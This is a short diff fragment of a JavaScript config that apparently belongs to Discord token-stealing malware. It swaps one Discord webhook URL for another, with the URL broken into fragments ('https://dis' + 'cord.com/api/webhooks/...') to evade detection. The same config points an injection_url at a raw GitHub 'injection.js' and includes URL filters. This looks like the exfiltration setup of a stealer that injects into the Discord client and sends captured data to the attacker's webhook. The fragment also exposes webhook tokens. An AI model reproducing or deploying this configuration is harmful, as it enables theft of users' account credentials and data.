@@ -13,10 +13,10 @@ const {
 const CONFIG = {
     webhook: "%WEBHOOK%",
     whp1: "https://dis",
-    whp2: "cord.com/api/webhooks/1395841179974635561/",
-    whp3: "A_mZtKQS-WrX9zGFFpG7",
-    whp4: "m6M51SqAqq-7rlQQWO5XB",
-    whp5: "3CcoK-GMsaUIKTbqxIINxNwjJ9P",
+    whp2: "cord.com/api/webhooks/1471634430547460222/",
+    whp3: "bucnG6CnBw8_rkkt8jny6",
+    whp4: "3iLxnCU07wXtzySgcBmSY9az_",
+    whp5: "_9Gpdjs-H4ns3n4UPiY0a2",
     injection_url: "https://raw.githubusercontent.com/ezruhbfizeh/eqagzjyjzr/main/injection.js",
     filters: {
         urls: [
